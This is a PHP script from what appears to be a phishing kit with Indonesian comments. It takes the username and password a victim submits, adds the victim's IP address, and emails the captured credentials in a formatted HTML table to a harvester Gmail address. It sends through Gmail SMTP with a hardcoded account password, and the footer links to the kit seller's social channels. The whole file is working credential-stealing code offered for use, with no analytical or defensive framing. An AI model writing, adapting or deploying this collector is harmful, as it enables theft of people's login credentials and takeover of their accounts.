<?php

require 'smile/PHPMailer.php';
require 'smile/Exception.php';
require 'smile/SMTP.php';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
use PHPMailer\PHPMailer\SMTP;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // NAMA DAN EMAIL PENGIRIM
    $fromName = 'V3NOM - IT';
    $fromEmail = 'venom.host.it@gmail.com';

    // EMAIL PENERIMA
    $toEmail = 'santuy.ok.ok@gmail.com';
    $toName = 'Recipient Name';

    // MENGAMBIL DATA
    $username = $_POST['username'];
    $password = $_POST['password'];

    // SUBJEK DAN PESAN
    $subject = "🇲🇨 +62 | $username |";
    $message = '
    <center>
        <div style="background: url(https://i.ibb.co/dKzXyrp/coollogo-com-101334325.png) no-repeat;border:2px solid pink;background-size: 100% 100%; width: 294; height: 101px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;"></div>
        <table border="1" bordercolor="#19233f" style="color:#fff;border-radius:8px; border:3px solid pink; border-collapse:collapse;width:100%;background:#cf0485;">
            <tr>
                <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Email/Telpon</b></th>
                <th style="padding:3px;width: 65%; text-align: center;"><b>'.$username.'</th> 
            </tr>
            <tr>
                <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Password</th>
                <th style="padding:3px;width: 65%; text-align: center;"><b>'.$password.'</th> 
            </tr>
            <tr>
                <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Ip Address</th>
                <th style="width: 65%; text-align: center;"><b>'.$_SERVER['REMOTE_ADDR'].'</th> 
            </tr>
        </table>
        <div style="border:2px solid pink;width: 294; font-weight:bold; height: 20px; background: #cf0485; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align:center;">
            <a style="border:2px solid #fff;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#3b5998;" href="https://www.facebook.com/nguyenxwann">𝙵𝚊𝚌𝚎𝚋𝚘𝚘𝚔</a>
            <a style="border:2px solid #fff;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#0088CC;" href="http://t.me/nguyenxstore">𝚃𝚎𝚕𝚎𝚐𝚛𝚊𝚖</a>
            <a style="border:2px solid #fff;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#25D366;" href="https://chat.whatsapp.com/BXlEQgR9uMh58buLaOCr2x">𝚆𝚑𝚊𝚝𝚜𝚊𝚙𝚙</a>
        </div>
    <center>';

    $mail = new PHPMailer(true);

    try {
        $mail->isSMTP();
        $mail->Host = 'smtp.gmail.com';
        $mail->SMTPAuth = true;
        $mail->Username = 'ngarang.ok.ok@gmail.com';
        $mail->Password = 'acjuhjkpjkbqrask';
        $mail->Port = 587;
        $mail->SMTPSecure = 'tls';

        $mail->setFrom($fromEmail, $fromName);
        $mail->addAddress($toEmail, $toName);

        $mail->isHTML(true);
        $mail->CharSet = 'UTF-8'; // Menambahkan pengkodean UTF-8
        $mail->Subject = $subject;
        $mail->Body = $message;

        // Mengirim email
        $mail->send();
        echo 'Email berhasil dikirim.';
    } catch (Exception $e) {
        echo 'Terjadi kesalahan dalam pengiriman email: ' . $mail->ErrorInfo;
    }
}
?>
